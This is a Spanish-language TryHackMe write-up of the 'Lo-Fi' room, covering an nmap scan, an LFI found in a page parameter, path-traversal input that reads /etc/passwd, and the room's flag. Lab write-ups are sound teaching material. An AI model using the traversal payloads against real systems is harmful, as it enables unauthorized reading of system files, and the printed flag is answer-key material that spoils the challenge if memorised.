---
title: "TryHackMe - Lo-Fi "
date: 2025-10-15
lastmod: 2025-10-15
categories: [TryHackMe]
tags: [Web, TryHackMe, CTF, Linux, LFI, Path Traversal]
toc: true
math: false
mermaid: true
image:
  path: assets/img/TryHackMe/Lo-Fi/logo.png
---

## Target
- **Host:** `http://lofi.thm`  
- **Plataforma:** TryHackMe   
- **Nivel:** <span style="color: #66bb6a;">Easy</span>
- **Objetivo:** Encontrar la flag.

---

## Introduccion

Esta máquina es vulnerable a LFI (Local File Inclusion).
Un LFI permite a un atacante que controle un parámetro usado para incluir archivos en el servidor leer ficheros locales (p. ej. /etc/passwd, archivos de configuración) y, en determinadas condiciones del entorno, escalar el impacto. En este writeup mostraré cómo identifiqué y exploté la capacidad de lectura de archivos para la enumeración y obtención de la flag.

## Enumeración

Empiezo enumerando los puertos abiertos para identificar los servicios que corre la máquina. Como siempre, primero añado `lofi.thm` a mi archivo `/etc/hosts` y, a continuación, lanzo `nmap`.

```bash
nmap -T4 -p- -sS -sV -sC -oA nmap/first lofi.thm
```
| Parámetro | Descripción |
| :--- | :--- |
| **-T4** | Aumenta la velocidad del escaneo. |
| **-p-** | Escanea todos los puertos especificados. |
| **-sS** | SYN scan, rápido y eficiente para detectar puertos abiertos. |
| **-sV** | Detecta la versión del servicio. |
| **-sC** | Ejecuta los scripts NSE por defecto. |
| **-oA nmap/first** | Guarda la salida en tres formatos (`.nmap`, `.xml`, `.gnmap`). |
| **lofi.thm** | Host resuelto mediante `/etc/hosts` (evita usar la IP directamente). |

A continuación, se muestra el resultado detallado del escaneo, donde encontramos dos puertos abiertos: el servicio ssh y el servicio web HTTP en Linux.

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-15 14:35 BST
Nmap scan report for lofi.thm (10.10.90.159)
Host is up (0.00014s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Lo-Fi Music
MAC Address: 02:7D:39:98:AE:E5 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
```

### Enumeración puerto 80

Web Principal

![Web principal](assets/img/TryHackMe/Lo-Fi/website.png)

Al navegar y pulsar en relax observamos la URL ?page=relax.php, lo que sugiere que el parámetro page se usa directamente para cargar archivos, posible **LFI**:

![relax](assets/img/TryHackMe/Lo-Fi/relax.png)

Cuando intento establecer rutas del sistema, la aplicación responde con un mensaje indicando bloqueo por un WAF u otra protección:

![lfi](assets/img/TryHackMe/Lo-Fi/lfi.png)

Teniendo en cuenta que el servidor web es Apache, intentaremos acceder a la ruta /etc/passwd con path traversal.  

**Path traversal**: usar ../ (o variantes codificadas) para subir en el árbol de directorios y acceder a archivos fuera del directorio web, p. ej. ../../../../etc/passwd.

¿Qué hace ../../../../etc/passwd?
Cada .. sube un nivel en la jerarquía de carpetas. Si concatenas suficientes ../ desde la carpeta donde la web incluye archivos, puedes alcanzar la raíz del sistema y acceder a /etc/passwd. En sistemas modernos /etc/passwd contiene usuarios y UIDs pero no las contraseñas en texto (esas están en /etc/shadow).

Probamos con  ../../../../../etc/passwd y vemos que nos muestra el contenido de /etc/passwd 

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
```
![vulnerabilidad](assets/img/TryHackMe/Lo-Fi/vulnerabilidad.png)

Para encontrar la flag una pista que da antes de empezar la maquina es la siguiente:
`find the flag in the root of the filesystem.`
Esta pista nos da varias rutas a pensar:
- /root/
- /

Posibles nombres de archivos donde se  suelen ubican las flags:
- root.txt
- flag.txt

Probamos en el directorio raiz / el archivo flag.txt
![flag](assets/img/TryHackMe/Lo-Fi/flag.png)

Y encontramos la flag :
- `flag{e4478e0eab69bd642b8238765dcb7d18}`